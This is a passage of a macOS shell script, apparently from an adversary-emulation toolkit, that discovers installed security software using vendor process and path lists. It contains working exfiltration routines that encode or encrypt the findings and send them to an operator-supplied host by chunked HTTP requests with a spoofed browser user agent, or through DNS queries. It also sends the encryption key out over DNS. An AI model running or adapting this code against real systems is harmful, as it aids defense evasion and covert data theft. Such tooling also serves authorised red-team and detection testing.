    core_debug_print "Arguments parsed: VERBOSE=$VERBOSE, DEBUG=$DEBUG, FORMAT=$FORMAT, ENCODE=$ENCODE, ENCRYPT=$ENCRYPT"
}

# Display help message
core_display_help() {
    cat << EOF
Usage: ${0##*/} [OPTIONS]

Description: Discovers security software on macOS using native tools
MITRE ATT&CK: ${TTP_ID} - ${TACTIC} - Security Software Discovery

Basic Options:
  -h, --help           Display this help message
  -v, --verbose        Enable verbose output with execution details
  -d, --debug          Enable debug output (includes verbose output)
  -a, --all            Process all available security checks
  -l, --log            Enable logging to file (logs stored in $LOG_DIR)
  -t, --test           Run in test mode (runs a simple directory listing)

Security Check Options:
  --edr                Check for EDR solutions (all EDR checks)
  --edr-ps             Check for EDR processes using ps
  --edr-files          Check for EDR files and paths using ls
  --edr-dir            Check directories for EDR indicators using ls
  --edr-info           Get detailed info about EDR applications only
  --av                 Check for Antivirus products
  --ost                Check for Objective-See security tools
  --fw                 Check macOS Application Firewall
  --hids               Check for Host Intrusion Detection Systems
  --xp                 Check macOS XProtect built-in protection
  --mrt                Check macOS Malware Removal Tool
  --gk                 Check macOS Gatekeeper
  --tcc                Check macOS Transparency, Consent, and Control database
  --log-forwarder      Check for Log Forwarders (Splunk, Fluentd, etc.)
  --vpn                Check for VPN solutions (Cisco, OpenVPN, etc.)

Output Options:
  -f, --format TYPE    Output format: json, csv, or raw (default)
  --encode TYPE        Encode output (base64, hex, perl_b64, perl_utf8)
  --encrypt TYPE       Encrypt output (aes, gpg)
  --exfil-dns DOMAIN   Exfiltrate data via DNS queries
  --exfil-http URL     Exfiltrate data via HTTP POST
  --chunk-size SIZE    Size of chunks for exfiltration (default: $CHUNK_SIZE bytes)
  --proxy URL          Use proxy for HTTP requests

Examples:
  ${0##*/} --edr-info --format json         # Check EDR only
  ${0##*/} --edr-ps --av --format json      # Check EDR processes and antivirus
  ${0##*/} --fw --gk                        # Check firewall and gatekeeper
  ${0##*/} --all --exfil-http example.com   # Check all and exfiltrate via HTTP
EOF
}

# Process output according to format, encoding, and encryption settings
core_process_output() {
    local output="$1"
    local data_source="${2:-generic}"
    local processed="$output"
    local encoded=""
    local is_encoded=false
    local is_encrypted=false
    
    # Apply encoding if requested (do this before formatting)
    if [ "$ENCODE" != "none" ]; then
        core_debug_print "Applying encoding: $ENCODE"
        encoded=$(core_encode_output "$output" "$ENCODE")
        is_encoded=true
    else
        encoded="$output"
    fi
    
    # Apply encryption if requested
    if [ "$ENCRYPT" != "none" ]; then
        core_debug_print "Applying encryption: $ENCRYPT"
        processed=$(core_encrypt_output "$encoded" "$ENCRYPT")
        is_encrypted=true
    else
        processed="$encoded"
    fi
    
    # Format the output if requested (do this after encoding/encryption)
    if [ -n "$FORMAT" ]; then
        if [ "$FORMAT" = "json" ] || [ "$FORMAT" = "JSON" ]; then
            # For JSON, indicate encoding/encryption in metadata
            processed=$(core_format_output "$processed" "$FORMAT" "$data_source" "$is_encoded" "$ENCODE" "$is_encrypted" "$ENCRYPT")
        else
            # For other formats, just format the processed output
            processed=$(core_format_output "$processed" "$FORMAT" "$data_source")
        fi
    fi
    
    echo "$processed"
}

# Format output as JSON, CSV, or raw
core_format_output() {
    local output="$1"
    local format="$2"
    # Convert to lowercase using tr for sh compatibility
    format=$(echo "$format" | tr '[:upper:]' '[:lower:]')
    local data_source="${3:-generic}"
    local is_encoded="${4:-false}"
    local encoding="${5:-none}"
    local is_encrypted="${6:-false}"
    local encryption="${7:-none}"
    local formatted="$output"
    
    case "$format" in
        json|json-lines)
            formatted=$(core_format_as_json "$output" "$data_source" "$is_encoded" "$encoding" "$is_encrypted" "$encryption")
            ;;
        csv)
            formatted=$(core_format_as_csv "$output")
            ;;
        *)
            # Keep as raw
            ;;
    esac
    
    echo "$formatted"
}

# Convert output to JSON format
core_format_as_json() {
    local output="$1"
    local data_source="${2:-generic}"
    local is_encoded="${3:-false}"
    local encoding="${4:-none}"
    local is_encrypted="${5:-false}"
    local encryption="${6:-none}"
    local json_output=""
    local timestamp=$(core_get_timestamp)
    
    # Create JSON structure - POSIX-compliant approach with direct string concatenation
    json_output="{"
    json_output="$json_output
  \"timestamp\": \"$timestamp\","
    json_output="$json_output
  \"command\": \"$SCRIPT_CMD\","
    json_output="$json_output
  \"jobId\": \"$JOB_ID\","
    json_output="$json_output
  \"dataSource\": \"$data_source\","
    
    # Always include encoding and encryption status
        json_output="$json_output
  \"encoding\": {"
    json_output="$json_output
    \"enabled\": $is_encoded,"
    json_output="$json_output
    \"method\": \"$encoding\"
  },"
    
        json_output="$json_output
  \"encryption\": {"
    json_output="$json_output
    \"enabled\": $is_encrypted,"
    json_output="$json_output
    \"method\": \"$encryption\"
  },"
    
    json_output="$json_output
  \"data\": ["
    
    # Process each line
    local line_count=0
    while IFS= read -r line || [ -n "$line" ]; do
        # Skip empty lines
        [ -z "$line" ] && continue
        
        # Add comma if not first line
        if [ $line_count -gt 0 ]; then
            json_output="$json_output,"
        fi
        
        # Escape special characters
        line=$(echo "$line" | sed 's/\\/\\\\/g; s/"/\\"/g')
        
        # Check if line is a number and JSON_DETECT_NUMBERS is true
        if [ "$JSON_DETECT_NUMBERS" = true ] && echo "$line" | grep -E '^[0-9]+$' > /dev/null; then
            json_output="$json_output
      $line"
        else
            # Wrap in quotes for string
            json_output="$json_output
      \"$line\""
        fi
        
        line_count=$((line_count + 1))
    done <<< "$output"
    
    # Close JSON structure
    json_output="$json_output
    ]
}"
    
    # Output the JSON string directly
    echo "$json_output"
}

# Convert pipe-delimited output to CSV format
core_format_as_csv() {
    local output="$1"
    local csv_output=""
    
    # Process each line
    while IFS= read -r line || [ -n "$line" ]; do
        # Skip empty lines
        [ -z "$line" ] && continue
        
        # Replace pipe delimiters with commas
        csv_line=$(echo "$line" | sed 's/|/,/g')
        
        # Add to CSV output
        if [ -z "$csv_output" ]; then
            csv_output="$csv_line"
        else
            csv_output="${csv_output}\n$csv_line"
        fi
    done <<< "$output"
    
    # Output CSV directly
    echo "$csv_output"
}

# Encode output using the specified method
core_encode_output() {
    local output="$1"
    local encode_type="$2"
    # Convert to lowercase using tr for sh compatibility
    encode_type=$(printf '%s' "$encode_type" | tr '[:upper:]' '[:lower:]')
    local encoded=""
    
    case "$encode_type" in
        base64|b64)
            # Debug information
            core_debug_print "Encoding with base64"
            encoded=$(printf '%s' "$output" | $CMD_BASE64)
            ;;
        hex)
            core_debug_print "Encoding with hex"
            encoded=$(printf '%s' "$output" | $CMD_XXD -p | tr -d '\n')
            ;;
        perl_b64)
            core_debug_print "Encoding with perl base64"
            if command -v perl > /dev/null 2>&1; then
                encoded=$(printf '%s' "$output" | perl -MMIME::Base64 -e 'print encode_base64(<STDIN>);')
            else
                core_debug_print "Perl not found, falling back to standard base64"
                encoded=$(printf '%s' "$output" | $CMD_BASE64)
            fi
            ;;
        perl_utf8)
            core_debug_print "Encoding with perl utf8"
            if command -v perl > /dev/null 2>&1; then
                encoded=$(printf '%s' "$output" | perl -e 'while (read STDIN, $buf, 1024) { print unpack("H*", $buf); }')
            else
                core_debug_print "Perl not found, falling back to hex encoding"
                encoded=$(printf '%s' "$output" | $CMD_XXD -p | tr -d '\n')
            fi
            ;;
        *)
            # Return unmodified if unknown encoding type
            core_debug_print "Unknown encoding type: $encode_type - using raw"
            encoded="$output"
            ;;
    esac
    
    echo "$encoded"
}

# URL-safe encode data for exfiltration
core_url_safe_encode() {
    local data="$1"
    local encoded
    
    # First base64 encode
    encoded=$(printf '%s' "$data" | $CMD_BASE64)
    
    # Then make URL-safe by replacing + with - and / with _
    encoded=$(printf '%s' "$encoded" | tr '+/' '-_' | tr -d '=')
    
    echo "$encoded"
}

# DNS-safe encode data for exfiltration
core_dns_safe_encode() {
    local data="$1"
    local encoded
    
    # Always base64 encode first for consistency
    encoded=$(printf '%s' "$data" | $CMD_BASE64)
    
    # Make DNS-safe (replace + with -, / with _, remove =)
    encoded=$(printf '%s' "$encoded" | tr '+/' '-_' | tr -d '=')
    
    echo "$encoded"
}

# Main encryption function that determines which specific encryption method to use
core_encrypt_output() {
    local data="$1"
    local method="$2"
    local key="${3:-$ENCRYPT_KEY}"
    
    # Convert to lowercase using tr for sh compatibility
    method=$(printf '%s' "$method" | tr '[:upper:]' '[:lower:]')
    
    case "$method" in
        "none")
            # No encryption, just return the original data
            core_debug_print "No encryption requested, returning raw data"
            printf '%s' "$data"
            return 0
            ;;
        "aes")
            # Use AES encryption method
            core_debug_print "Using AES encryption method"
            encrypt_with_aes "$data" "$key"
            return $?
            ;;
        "gpg")
            # Use GPG encryption method
            core_debug_print "Using GPG encryption method"
            encrypt_with_gpg "$data" "$key"
            return $?
            ;;
        *)
            # Invalid encryption method
            core_debug_print "Unknown encryption type: $method - using raw"
            printf '%s' "$data"
            return 0
            ;;
    esac
}

# AES-specific encryption function
encrypt_with_aes() {
    local data="$1"
    local key="$2"
    
    # Use global command variable with AES-256-CBC
    local encrypted_data=$(printf '%s' "$data" | $CMD_OPENSSL enc -aes-256-cbc -base64 -k "$key" 2>/dev/null)
    if [ $? -eq 0 ]; then
        # Set the encryption type global var for caller
        ENCRYPTION_TYPE="aes"
        core_debug_print "AES encryption successful"
        printf '%s' "$encrypted_data"
        return 0
    else
        core_debug_print "AES encryption failed"
        printf 'Error: Failed to encrypt data with AES\n' >&2
        return 1
    fi
}

# GPG-specific encryption function
encrypt_with_gpg() {
    local data="$1"
    local key="$2"
    
    # First verify that GPG is available
    if ! command -v $CMD_GPG > /dev/null 2>&1; then
        core_debug_print "GPG command not found"
        printf 'Error: GPG command not found\n' >&2
        return 1
    fi
    
    # Use GPG with armor output (ASCII) for direct piping - no temp files needed
    local encrypted_data=$(printf '%s' "$data" | $CMD_GPG $CMD_GPG_OPTS --passphrase "$key" 2>/dev/null)
    if [ $? -eq 0 ] && [ -n "$encrypted_data" ]; then
        # Set the encryption type global var for caller
        ENCRYPTION_TYPE="gpg"
        core_debug_print "GPG encryption successful"
        printf '%s' "$encrypted_data"
        return 0
    else
        core_debug_print "GPG encryption failed"
        printf 'Error: Failed to encrypt data with GPG\n' >&2
        return 1
    fi
}

# Handle the output (log, exfil, or display)
core_transform_output() {
    local output="$1"
    
    # Log the output if logging is enabled
    if [ "$LOG_ENABLED" = true ]; then
        core_log_output "$output" "output" false
    fi
    
    # Exfiltrate the output if exfiltration is enabled
    if [ "$EXFIL" = true ]; then
        core_exfiltrate_data "$output"
    fi
    
    # Always print data to ensure it's visible
    # Important to display encrypted/encoded data even when logging
    $CMD_PRINTF "%s\n" "$output"
    
    # When encrypting, also print the key in debug mode
    if [ "$DEBUG" = true ] && [ "$ENCRYPT" != "none" ]; then
        $CMD_PRINTF "[DEBUG] [%s] Encryption key: %s\n" "$(core_get_timestamp)" "$ENCRYPT_KEY" >&2
    fi
}

# Exfiltrate data using the specified method
core_exfiltrate_data() {
    local data="$1"
    
    # Log exfiltration attempt
    if [ "$LOG_ENABLED" = true ]; then
        core_log_output "Exfiltrating data via $EXFIL_METHOD" "info" false
    fi
    
    case "$EXFIL_METHOD" in
        http|https)
            # Exfiltrate via HTTP/HTTPS
            if [ -z "$EXFIL_URI" ]; then
                core_handle_error "No exfiltration URI specified"
                return 1
            fi
            
            # Prepare data with optional markers
            local exfil_data="$data"
            if [ -n "$EXFIL_START" ]; then
                exfil_data="${EXFIL_START}${exfil_data}"
            fi
            if [ -n "$EXFIL_END" ]; then
                exfil_data="${exfil_data}${EXFIL_END}"
            fi
            
            # Encode data for transmission
            local encoded_data
            encoded_data=$(core_url_safe_encode "$exfil_data")
            core_debug_print "URL-safe encoded data: ${#encoded_data} bytes"
            
            # Prepare full URL with protocol if not present
            local full_uri="$EXFIL_URI"
            if ! echo "$full_uri" | grep -q "^http" ; then
                full_uri="http://$full_uri"
                core_debug_print "Added http:// prefix to URI: $full_uri"
            fi
            
            # Add proxy if specified (using proper format)
            local proxy_arg=""
            if [ -n "$PROXY_URL" ]; then
                # Check if proxy has protocol prefix, add http:// if missing
                if ! echo "$PROXY_URL" | grep -q "^http" ; then
                    PROXY_URL="http://$PROXY_URL"
                fi
                core_debug_print "Using proxy: $PROXY_URL"
                proxy_arg="--proxy $PROXY_URL"
            fi
            
            # User Agent string for all requests
            local user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
            
            # Check if this is a legacy exfil-uri request or new exfil-http
            if [ "$EXFIL_TYPE" = "http" ]; then
                # New method - use POST
                core_debug_print "Using HTTP POST for exfiltration (--exfil-http)"
                
                # Handle encrypted data with DNS key exfiltration
                if [ "$ENCRYPT" != "none" ] && [ -n "$ENCRYPT_KEY" ]; then
                    # Extract domain from the URI for DNS exfiltration
                    local domain
                    domain=$(printf '%s' "$full_uri" | sed -E 's~^https?://([^/:]+).*~\1~')
                    
                    core_debug_print "Sending encryption key via DNS to domain: $domain"
                    
                    # First send the encryption key via DNS
                    # Convert key to base64 DNS-safe format
                    local dns_safe_key
                    dns_safe_key=$(printf '%s' "key:$ENCRYPT_KEY:$JOB_ID" | $CMD_BASE64 | tr '+/' '-_' | tr -d '=')
                    
                    # Try to send key via DNS queries, but continue even if it fails
                    core_debug_print "Attempting to send encryption key via DNS to domain: $domain"
                    if ! $CMD_DIG $CMD_DIG_OPTS "k.$JOB_ID.$dns_safe_key.$domain" A > /dev/null 2>&1; then
                        core_debug_print "Warning: Failed to send encryption key via DNS, continuing with HTTP only"
                        # Include key in metadata instead of DNS
                        local encrypted_key=$(printf '%s' "$ENCRYPT_KEY" | $CMD_BASE64)
                        # Don't abort on DNS failure
                    else
                        core_debug_print "Successfully sent encryption key via DNS"
                    fi
                    
                    # Determine content type based on encoding
                    local content_type="application/json"
                    
                    # Create payload with metadata
                    local hostname
                    hostname=$(hostname 2>/dev/null || echo "unknown")
                    
                    local json_payload
                    
                    # Include encryption key in payload if DNS failed and we have an encrypted_key
                    if [ -n "${encrypted_key:-}" ]; then
                        json_payload=$(cat << EOF
{
  "encrypted_data": "$encoded_data",
  "metadata": {
    "hostname": "$hostname",
    "jobId": "$JOB_ID",
    "timestamp": "$(core_get_timestamp)",
    "ttpId": "$TTP_ID",
    "tactic": "$TACTIC",
    "encoding": "$ENCODING_TYPE",
    "encryption": "$ENCRYPTION_TYPE",
    "key": "$encrypted_key"
  }
}
EOF
)
                    else
                        json_payload=$(cat << EOF
{
  "encrypted_data": "$encoded_data",
  "metadata": {
    "hostname": "$hostname",
    "jobId": "$JOB_ID",
    "timestamp": "$(core_get_timestamp)",
    "ttpId": "$TTP_ID",
    "tactic": "$TACTIC",
    "encoding": "$ENCODING_TYPE",
    "encryption": "$ENCRYPTION_TYPE"
  }
}
EOF
)
                    fi
                    
                    # Execute the POST request
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -X POST \
                        -A "$user_agent" \
                        -H "Content-Type: $content_type" \
                -H "X-Job-ID: $JOB_ID" \
                        -H "X-Encryption: $ENCRYPTION_TYPE" \
                        -H "X-Encoding: $ENCODING_TYPE" \
                        --data-binary "$json_payload" \
                        "$full_uri" > /dev/null 2>&1
                else
                    # Determine content type based on encoding
                    local content_type="text/plain"
                    if [ "$ENCODE" = "base64" ] || [ "$ENCODE" = "b64" ]; then
                        content_type="application/base64"
                    elif [ "$ENCODE" = "hex" ] || [ "$ENCODE" = "xxd" ]; then
                        content_type="application/octet-stream"
                    fi
                    
                    # Send unencrypted data via POST
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -X POST \
                        -A "$user_agent" \
                        -H "Content-Type: $content_type" \
                        -H "X-Job-ID: $JOB_ID" \
                        -H "X-Encoding: $ENCODING_TYPE" \
                        --data-binary "$encoded_data" \
                        "$full_uri" > /dev/null 2>&1
                fi
            else
                # Legacy method - use GET with URL parameters (with chunking)
                core_debug_print "Using HTTP GET for exfiltration (legacy --exfil-uri)"
                
                # Maximum safe URL length (2048 is conservative for most browsers/servers)
                local max_url_length=1800
                local base_url_length=${#full_uri}
                local max_data_length=$((max_url_length - base_url_length - 50))  # 50 for other params
                
                # Chunk size calculation - use smaller of chunk_size or max_data_length
                local chunk_size=$CHUNK_SIZE
                if [ $max_data_length -lt $chunk_size ]; then
                    chunk_size=$max_data_length
                    core_debug_print "Adjusted chunk size to $chunk_size bytes to fit URL length limits"
                fi
                
                # Set headers for data type
                local encoding_header=""
                if [ "$ENCODE" != "none" ]; then
                    encoding_header="-H \"X-Encoding: $ENCODING_TYPE\""
                fi
                
                # Send data in chunks
                local chunk_num=0
                local start_pos=0
                local data_len=${#encoded_data}
                local success=true
                
                # Send start signal
                core_debug_print "Sending HTTP GET start signal"
                $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                    -G \
                    -A "$user_agent" \
                    -H "X-Job-ID: $JOB_ID" \
                    --data-urlencode "signal=start" \
                    --data-urlencode "id=$JOB_ID" \
                    "$full_uri" > /dev/null 2>&1
                
                while [ $start_pos -lt $data_len ]; do
                    local chunk="${encoded_data:$start_pos:$chunk_size}"
                    start_pos=$((start_pos + chunk_size))
                    
                    core_debug_print "Sending HTTP GET chunk $chunk_num (${#chunk} bytes)"
                    
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -G \
                        -A "$user_agent" \
                        -H "X-Job-ID: $JOB_ID" \
                        -H "X-Encoding: $ENCODING_TYPE" \
                        --data-urlencode "d=$chunk" \
                        --data-urlencode "id=$JOB_ID" \
                        --data-urlencode "chunk=$chunk_num" \
                        "$full_uri" > /dev/null 2>&1
            
            if [ $? -ne 0 ]; then
                        core_handle_error "Failed to send HTTP chunk $chunk_num"
                        success=false
                        break
                    fi
                    
                    $CMD_SLEEP 0.1  # Rate limiting
                    chunk_num=$((chunk_num + 1))
                done
                
                # Send end signal if everything was successful
                if [ "$success" = true ]; then
                    core_debug_print "Sending HTTP GET end signal"
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -G \
                        -A "$user_agent" \
                        -H "X-Job-ID: $JOB_ID" \
                        --data-urlencode "signal=end" \
                        --data-urlencode "id=$JOB_ID" \
                        --data-urlencode "chunks=$chunk_num" \
                        "$full_uri" > /dev/null 2>&1
                    
                    if [ $? -ne 0 ]; then
                        core_handle_error "Failed to send HTTP end signal"
                return 1
            fi
            
                    core_debug_print "HTTP GET exfiltration completed successfully ($chunk_num chunks)"
                else
                    return 1
                fi
            fi
            
            if [ $? -ne 0 ]; then
                core_handle_error "Failed to exfiltrate data via $EXFIL_METHOD"
                return 1
            fi
            
            core_verbose_print "Data exfiltrated successfully via $EXFIL_METHOD"
            ;;
            
        dns)
            if [ -z "$EXFIL_URI" ]; then
                core_handle_error "No domain specified for DNS exfiltration"
                return 1
            fi
            
            core_debug_print "DNS Exfiltration to domain: $EXFIL_URI"
            core_debug_print "Data to exfiltrate: ${#data} bytes"
            core_debug_print "Using chunk size: $CHUNK_SIZE bytes"
    
            # First ensure data is encoded for DNS transmission
            local dns_data="$data"
    if [ "$ENCODE" = "none" ]; then
                # Encode if not already done
                dns_data=$(core_dns_safe_encode "$data")
                core_debug_print "Auto-encoded data with base64 for DNS transmission"
            else
                # Make DNS safe if already encoded
                dns_data=$(printf '%s' "$dns_data" | tr '+/' '-_' | tr -d '=')
                core_debug_print "Made pre-encoded data DNS-safe"
            fi
    
            core_debug_print "DNS-safe encoded data: ${#dns_data} bytes"
    
    # Maximum DNS label length (63) minus prefix length
            # Ensure chunk size is not too large for DNS
            local max_label_size=63
            local prefix_length=10 # Approximate length of prefix like "p0."
            local max_allowed_chunk=$((max_label_size - prefix_length))
            
            local max_chunk_size=$CHUNK_SIZE
            if [ $max_chunk_size -gt $max_allowed_chunk ]; then
                core_debug_print "Chunk size $max_chunk_size exceeds maximum allowed ($max_allowed_chunk). Adjusting."
                max_chunk_size=$max_allowed_chunk
            fi
    
    # Send start signal
            core_debug_print "Sending start signal to $EXFIL_URI"
            if ! $CMD_DIG $CMD_DIG_OPTS "start.${EXFIL_URI}" A > /dev/null 2>&1; then
                core_handle_error "Failed to send DNS start signal"
                return 1
            fi
    
            # Split and send data
    local chunk_num=0
    local start_pos=0
            local data_len=${#dns_data}
            local success=true
    
    while [ $start_pos -lt $data_len ]; do
                local chunk="${dns_data:$start_pos:$max_chunk_size}"
        start_pos=$((start_pos + max_chunk_size))
        
                local query="p${chunk_num}.${chunk}.${EXFIL_URI}"
                core_debug_print "Sending DNS query: chunk $chunk_num (${#chunk} bytes)"
        
                if ! $CMD_DIG $CMD_DIG_OPTS "$query" A > /dev/null 2>&1; then
                    core_handle_error "Failed to send DNS chunk $chunk_num"
                    success=false
                    break
                fi
                
                $CMD_SLEEP 0.1  # Rate limiting
        chunk_num=$((chunk_num + 1))
    done
    
            # Send end signal if everything was successful
            if [ "$success" = true ]; then
                core_debug_print "Sending end signal to $EXFIL_URI"
                if ! $CMD_DIG $CMD_DIG_OPTS "end.${EXFIL_URI}" A > /dev/null 2>&1; then
                    core_handle_error "Failed to send DNS end signal"
                    return 1
                fi
                
                core_debug_print "DNS exfiltration completed successfully ($chunk_num chunks)"
                return 0
            fi
            
            return 1
            ;;
            
        *)
            core_handle_error "Unknown exfiltration method: $EXFIL_METHOD"
            return 1
            ;;
    esac
    
    return 0
}

#------------------------------------------------------------------------------
# Security Software Detection Functions
#------------------------------------------------------------------------------


# Security patterns are defined in their respective sections:
# - EDR_PATTERNS: Patterns for EDR products
# - AV_PATTERNS: Patterns for Antivirus products
# We use these specific pattern lists instead of a generic one
# to keep our searches targeted and maintainable

# List of security processes to check
SECURITY_PROCESSES=(
    "SentinelAgent"
    "falconctl"
    "CbOsxSensorService"
    "SophosScanD"
    "CylanceSvc"
    "mfetpd"
    "iCoreService"
    "eset_daemon"
    "kav"
    "bdservicehost"
    "XProtectService"
    "MRT"
    "com.apple.security.syspolicyd"
    "com.apple.trustd"
    "com.avast.daemon"
    "NortonSecurity"
    "WebrootSecureAnywhere"
    "f-secure"
    "Malwarebytes"
    "cyserver"
    "xagt"
    "SophosHome"
    "Avira"
    "VirusBarrier"
    "F-Secure-Safe"
    "McAfeeSecurity"
    "Symantec"
    "wdav"
    "kesl"
    # MacKeeper processes
    "MacKeeper"
    "MacKeeperAgent"
    "MacKeeper Info"
    "MacKeeperPrivilegedHelper"
    # Sophos processes
    "SophosServiceManager"
    "SophosConfigD"
    "SophosAntiVirus"
    "SophosUpdater"
    "SophosMcsAgentD"
    "Sophos Network Extension"
    "SophosCleanD"
    "SophosHealthD"
    "SophosEventMonitor"
    "SophosCryptoGuard"
    "SophosWebIntelligence"
    "SophosCBR"
    # Objective-See Tools
    "LuLu"
    "DoNotDisturb"
    "BlockBlock"
    "RansomWhere"
    "KnockKnock"
    "OverSight"
    "WhatsYourSign"
    "redcanary"
)

# System paths to check for security software
SYSTEM_PATHS=(
    "/Applications"
    "/Library"
    "/Library/Application Support" 
    "/System/Library/Extensions"
    "/Library/Extensions"
    "/System/Library/CoreServices"
    "/Library/LaunchAgents"
    "/Library/LaunchDaemons"
    "/System/Library/LaunchAgents"
    "/System/Library/LaunchDaemons"
    "$HOME/Library/LaunchAgents"
)

# Array of launch agent/daemon paths to check
LAUNCH_PATHS=(
    "/Library/LaunchAgents"
    "/Library/LaunchDaemons"
    "/System/Library/LaunchAgents"
    "/System/Library/LaunchDaemons"
    "$HOME/Library/LaunchAgents"
)

# List of security vendor paths to check
SECURITY_PATHS=(
    # Applications
    "/Applications/SentinelOne.app"
    "/Applications/CarbonBlack/CbOsxSensorService"
    "/Applications/LuLu.app"
    "/Applications/DoNotDisturb.app"
    "/Applications/BlockBlock.app"
    "/Applications/RansomWhere.app"
    "/Applications/KnockKnock.app"
    "/Applications/OverSight.app"
    "/Applications/WhatsYourSign.app"
    "/Applications/Red Canary Mac Monitor.app"
    # MacKeeper paths
    "/Applications/MacKeeper.app"
    "/Applications/MacKeeper.app/Contents/MacOS/MacKeeper"
    "/Applications/MacKeeper.app/Contents/Library/LaunchAgents/MacKeeperAgent.app"
    "/Applications/MacKeeper.app/Contents/Library/LaunchAgents/MacKeeper Info.app"
    "/Library/PrivilegedHelperTools/com.mackeeper.MacKeeperPrivilegedHelper"
    "/Library/LaunchDaemons/com.mackeeper.MacKeeperPrivilegedHelper.plist"
    "$HOME/Library/LaunchAgents/com.mackeeper.MacKeeperAgent.plist"
    "$HOME/Library/LaunchAgents/com.mackeeper.MacKeeper-Info.plist"
    # Sophos applications
    "/Applications/Sophos/Sophos Home.app"
    "/Applications/Sophos/Sophos Scan.app"
    "/Applications/Sophos/Remove Sophos Home.app"
    "/Applications/Sophos/Sophos Detection.app"
    # Library paths
    "/Library/CS/falconctl"
    "/Library/Sophos Anti-Virus"
    "/Library/Sophos Anti-Virus/SophosServiceManager.app"
    "/Library/Application Support/Cylance/Desktop/CylanceUI.app"
    "/usr/local/McAfee"
    "/Library/Application Support/TrendMicro"
    "/Library/Application Support/com.eset.remoteadministrator.agent"
    "/Library/Application Support/Kaspersky"
    "/Library/PrivilegedHelperTools/com.sophos.macendpoint.Installer.HelperTool"
    "/Library/SophosCBR/SophosCBR.bundle"
    # Security directories
    "/Library/CS"
    "/Library/CrowdStrike"
    "/Library/Sentinel"
    "/Library/Extensions/CbOsxSensorExtension.kext"
    "/Library/Extensions/SentinelExtension.kext"
    "/Library/Extensions/CylanceDRIVERosx.kext"
    "/Library/Application Support/Cylance"
    "/Library/Application Support/CrowdStrike"
    "/Library/Application Support/Sophos"
    "/Library/Application Support/Carbon Black"
    "/Library/SophosCBR"
    "/Applications/Sophos"
    # LaunchDaemons and LaunchAgents
    "/Library/LaunchDaemons/com.crowdstrike.*"
    "/Library/LaunchDaemons/com.sentinelone.*"
    "/Library/LaunchDaemons/com.carbonblack.*"
    "/Library/LaunchDaemons/com.vmware.carbonblack.*"
    "/Library/LaunchDaemons/com.cylance.*"
    "/Library/LaunchDaemons/com.microsoft.defender.*"
    "/Library/LaunchDaemons/com.sophos.*"
    "/Library/LaunchAgents/com.sophos.*"
    "/Library/PrivilegedHelperTools/com.sophos.*"
        "/Library/CS"
    "/Library/CrowdStrike" 
    "/Library/Sentinel" 
    "/Library/Carbon"
    "/Library/Extensions/CbOsxSensorExtension.kext"
    "/Library/Extensions/SentinelExtension.kext"
    "/Library/Extensions/CylanceDRIVERosx.kext"
)

# AV vendor data
AV_VENDOR_PROC=(
    "MacKeeper:MacKeeper,MacKeeperAgent,com.mackeeper.MacKeeperPrivilegedHelper"
    "Malwarebytes:RTProtectionDaemon,FrontendAgent,SettingsDaemon"
    "Avast:AvastUI"
    "AvastBusinessAntivirusforMac:AvastBusinessUI"
    "AvastFreeAntivirusforMac:AvastFreeUI"
    "AvastSecurity:AvastSecurityUI"
    "Avira:AviraUI"
    "AviraAntivirus:AviraAntivirusUI"
    "AviraFreeAntivirusforMac:AviraFreeUI"
    "Bitdefender:bdmd"
    "BitdefenderAntivirusforMac:bdmd"
    "BitdefenderAntivirusFree:bdmd"
    "BitdefenderGravityZone:bdmd"
    "ESET:ec_service"
    "ESETCyberSecurityforMac:ec_service"
    "ESETNOD32:ESETNOD32Service"
    "F-SecureElements:FSElementsService"
    "Kaspersky:kavsvc"
    "KasperskyFreeAntivirusforMac:kavsvc"
    "KasperskySecurityCloud:kavsvc"
    "MicrosoftDefender:Defender"
    "Norton360:Norton360Service"
    "PandaAdaptiveDefense:PandaAdaptiveService"
    "PandaSecurity:PandaService"
    "Proofpoint:ProofpointAgent"
    "Webroot:WRSAService"
    "WebrootBusinessEndpointProtection:WRBusinessService"
    "WebrootSecureAnywhere:WRSAService"
)

AV_VENDOR_APP=(
    "MacKeeper.app"
    "Avast.app"
    "AvastBusiness.app"
    "AvastFree.app"
    "AvastSecurity.app"
    "Avira.app"
    "AviraAntivirus.app"
    "AviraFree.app"
    "Bitdefender.app"
    "BitdefenderMac.app"
    "BitdefenderFree.app"
    "GravityZone.app"
    "ESET.app"
    "CyberSecurity.app"
    "NOD32.app"
    "F-Secure.app"
    "Elements.app"
    "Kaspersky.app"
    "KasperskyFree.app"
    "SecurityCloud.app"
    "Microsoft Defender.app"
    "Norton360.app"
    "PandaAdaptive.app"
    "Panda.app"
    "Proofpoint.app"
    "Webroot.app"
    "WebrootBusiness.app"
    "WebrootSecureAnywhere.app"
    "Malwarebytes.app"
)

# Objective-See and additional macOS security tools
OST_PROC=(
    "BlockBlock:blockblock"
    "DoNotDisturb:DoNotDisturb"
    "LuLu:LuLu"
    "KnockKnock:KnockKnockDaemon"
    "OverSight:OverSight"
    "RansomWhere:RansomWhere"
)

OST_APP=(
    "BlockBlock.app"
    "DoNotDisturb.app"
    "LuLu.app"
    "KnockKnock.app"
    "OverSight.app"
    "RansomWhere.app"
)

# EDR vendor directories - these are part of the global EDR data section
# but are defined here to maintain backward compatibility
EDR_VENDOR_DIR=(
    "/Library/CS"
    "/Library/CrowdStrike" 
    "/Library/Sentinel" 
    "/Library/Carbon"
    "/Library/Extensions/CbOsxSensorExtension.kext"
    "/Library/Extensions/SentinelExtension.kext"
    "/Library/Extensions/CylanceDRIVERosx.kext"
)

# Core command helpers
cmd_ps() {
    local search_term="$1"
    ps -axrww | grep -v grep | grep --color=always "$search_term" 2>&1
}

cmd_ls_app_files() {
    ls -laR "/Applications/$1" 2>/dev/null
}

cmd_ls_app_dir() {
    ls -d "/Applications/$1" 2>/dev/null
}

cmd_sp_app() {
    local search_term="$1"
    system_profiler SPApplicationsDataType | grep -A 10 -i "$search_term" 2>/dev/null
}

# Discover EDR processes
discover_edr_ps() {
